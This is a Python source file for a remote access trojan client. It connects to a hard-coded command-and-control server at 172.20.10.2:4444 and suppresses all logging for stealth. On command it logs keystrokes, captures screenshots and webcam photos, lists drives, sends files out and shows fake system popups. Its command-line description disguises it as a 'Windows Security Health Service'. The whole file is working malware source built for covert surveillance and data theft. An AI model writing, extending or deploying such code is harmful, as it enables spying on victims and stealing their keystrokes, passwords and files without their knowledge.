"""
RAT Client Agent - Silent Version
Connects to C2 server and executes commands without console output
"""

import socket
import threading
import time
import sys
import os
import argparse
import logging

# Disable all console output for stealth mode
logging.disable(logging.CRITICAL)

# Add modules directory to path
sys.path.append(os.path.join(os.path.dirname(__file__), 'modules'))

from modules.screenshot import take_screenshot
from modules.popup import show_popup, show_info_popup, show_warning_popup, show_error_popup
from modules.photo import take_photo
from modules.keylogger import get_keylogger
from modules.file_browser import get_file_browser

# Import protocol from server directory
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'server'))
from protocol import Protocol, Commands, ResponseTypes

class RATClient:
    """RAT Client Agent - Silent Version"""
    
    def __init__(self, server_host='172.20.10.2', server_port=4444):
        self.server_host = server_host
        self.server_port = server_port
        self.socket = None
        self.running = False
        self.heartbeat_interval = 30  # seconds
        self.keylogger = None
        
    def connect(self) -> bool:
        """Connect to C2 server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_host, self.server_port))
            return True
        except Exception as e:
            return False
    
    def start(self):
        """Start the client agent"""
        if not self.connect():
            return
            
        self.running = True
        
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self.heartbeat_loop, daemon=True)
        heartbeat_thread.start()
        
        # Main command loop
        self.command_loop()
    
    def heartbeat_loop(self):
        """Send periodic heartbeat to server"""
        while self.running:
            try:
                time.sleep(self.heartbeat_interval)
                if self.running:
                    self.send_response(ResponseTypes.PONG)
            except:
                break
    
    def command_loop(self):
        """Main command processing loop"""
        buffer = ""
        
        while self.running:
            try:
                data = self.socket.recv(4096).decode('utf-8')
                if not data:
                    break
                    
                buffer += data
                while '\n' in buffer:
                    line, buffer = buffer.split('\n', 1)
                    if line.strip():
                        self.handle_command(line.strip())
                        
            except socket.error:
                break
            except Exception as e:
                break
                
        self.cleanup()
    
    def handle_command(self, command_data: str):
        """Handle incoming command from server"""
        try:
            parsed = Protocol.parse_message(command_data)
            if not parsed:
                return
                
            cmd = parsed.get('cmd')
            
            if cmd == Commands.PING:
                self.send_response(ResponseTypes.PONG)
                
            elif cmd == Commands.SCREENSHOT:
                self.handle_screenshot_command()
                
            elif cmd == Commands.POPUP:
                self.handle_popup_command(parsed)
                
            elif cmd == Commands.PHOTO:
                self.handle_photo_command()
                
            elif cmd == Commands.KEYLOG_START:
                self.handle_keylog_start_command()
                
            elif cmd == Commands.KEYLOG_STOP:
                self.handle_keylog_stop_command()
                
            elif cmd == Commands.FILE_LIST:
                self.handle_file_list_command(parsed)
                
            elif cmd == Commands.FILE_DOWNLOAD:
                self.handle_file_download_command(parsed)
                
            elif cmd == Commands.FILE_INFO:
                self.handle_file_info_command(parsed)
                
            elif cmd == Commands.GET_DRIVES:
                self.handle_get_drives_command()
                
            elif cmd == Commands.QUIT:
                self.running = False
                
            else:
                self.send_error(f"Unknown command: {cmd}")
                
        except Exception as e:
            self.send_error(f"Command handling error: {e}")
    
    def handle_screenshot_command(self):
        """Handle screenshot command"""
        try:
            screenshot_data = take_screenshot()
            
            if screenshot_data:
                self.send_response(ResponseTypes.SCREENSHOT, screenshot_data)
            else:
                self.send_error("Screenshot failed")
                
        except Exception as e:
            self.send_error(f"Screenshot error: {e}")
    
    def handle_popup_command(self, parsed_cmd):
        """Handle popup command"""
        try:
            title = parsed_cmd.get('title', 'System Notice')
            message = parsed_cmd.get('message', 'System update notification')
            popup_type = parsed_cmd.get('type', 'info')
            
            if popup_type == 'info':
                result = show_info_popup(title, message)
            elif popup_type == 'warning':
                result = show_warning_popup(title, message)
            elif popup_type == 'error':
                result = show_error_popup(title, message)
            else:
                result = show_popup(title, message)
            
            self.send_response(ResponseTypes.POPUP, {"button_pressed": result})
            
        except Exception as e:
            self.send_error(f"Popup error: {e}")
    
    def handle_photo_command(self):
        """Handle photo command"""
        try:
            photo_data = take_photo()
            
            if photo_data:
                self.send_response(ResponseTypes.PHOTO, photo_data)
            else:
                self.send_error("Photo capture failed")
                
        except Exception as e:
            self.send_error(f"Photo error: {e}")
    
    def handle_keylog_start_command(self):
        """Handle keylog start command"""
        try:
            # Initialize keylogger with callback to send data
            self.keylogger = get_keylogger()
            self.keylogger.callback = self.send_keylog_data
            
            success = self.keylogger.start_logging()
            
            if success:
                self.send_response(ResponseTypes.KEYLOG_STATUS, {
                    "status": "started",
                    "message": "Keylogger started successfully"
                })
            else:
                self.send_error("Failed to start keylogger")
                
        except Exception as e:
            self.send_error(f"Keylogger start error: {e}")
    
    def handle_keylog_stop_command(self):
        """Handle keylog stop command"""
        try:
            if self.keylogger:
                final_data = self.keylogger.stop_logging()
                
                # Send final data if available
                if final_data:
                    self.send_keylog_data(final_data)
                
                self.send_response(ResponseTypes.KEYLOG_STATUS, {
                    "status": "stopped",
                    "message": "Keylogger stopped successfully"
                })
            else:
                self.send_response(ResponseTypes.KEYLOG_STATUS, {
                    "status": "not_running",
                    "message": "Keylogger was not running"
                })
                
        except Exception as e:
            self.send_error(f"Keylogger stop error: {e}")
    
    def send_keylog_data(self, data: str):
        """Send keylog data to server"""
        try:
            if data and self.running:
                self.send_response(ResponseTypes.KEYLOG_DATA, {
                    "timestamp": time.time(),
                    "data": data
                })
        except Exception as e:
            pass
    
    def handle_file_list_command(self, parsed_cmd):
        """Handle file list command"""
        try:
            path = parsed_cmd.get('path')
            
            file_browser = get_file_browser()
            result = file_browser.list_directory(path)
            
            self.send_response(ResponseTypes.FILE_LIST, result)
            
        except Exception as e:
            self.send_error(f"File list error: {e}")
    
    def handle_file_download_command(self, parsed_cmd):
        """Handle file download command"""
        try:
            file_path = parsed_cmd.get('file_path')
            if not file_path:
                self.send_error("Missing file_path parameter")
                return
                
            file_browser = get_file_browser()
            result = file_browser.download_file(file_path)
            
            if result.get('success'):
                self.send_response(ResponseTypes.FILE_DOWNLOAD, result)
            else:
                self.send_error(f"File download failed: {result.get('error')}")
                
        except Exception as e:
            self.send_error(f"File download error: {e}")
    
    def handle_file_info_command(self, parsed_cmd):
        """Handle file info command"""
        try:
            file_path = parsed_cmd.get('file_path')
            if not file_path:
                self.send_error("Missing file_path parameter")
                return
                
            file_browser = get_file_browser()
            result = file_browser.get_file_info(file_path)
            
            self.send_response(ResponseTypes.FILE_INFO, result)
            
        except Exception as e:
            self.send_error(f"File info error: {e}")
    
    def handle_get_drives_command(self):
        """Handle get drives command"""
        try:
            file_browser = get_file_browser()
            result = file_browser.get_drives()
            
            self.send_response(ResponseTypes.DRIVES_LIST, result)
            
        except Exception as e:
            self.send_error(f"Get drives error: {e}")
    
    def send_response(self, response_type: str, payload=None):
        """Send response to server"""
        try:
            message = Protocol.create_response(response_type, payload)
            self.socket.send(message.encode('utf-8'))
        except Exception as e:
            pass
    
    def send_error(self, error_msg: str):
        """Send error message to server"""
        self.send_response(ResponseTypes.ERROR, error_msg)
    
    def cleanup(self):
        """Clean up client connection"""
        self.running = False
        
        # Stop keylogger if running
        if self.keylogger:
            try:
                self.keylogger.stop_logging()
            except:
                pass
        
        if self.socket:
            try:
                self.socket.close()
            except:
                pass

def main():
    parser = argparse.ArgumentParser(description='Windows Security Health Service')
    parser.add_argument('--host', default='172.20.10.2', help='Security server host')
    parser.add_argument('--port', type=int, default=4444, help='Security server port')
    
    args = parser.parse_args()
    
    client = RATClient(args.host, args.port)
    
    try:
        client.start()
    except:
        pass

if __name__ == "__main__":
    main() 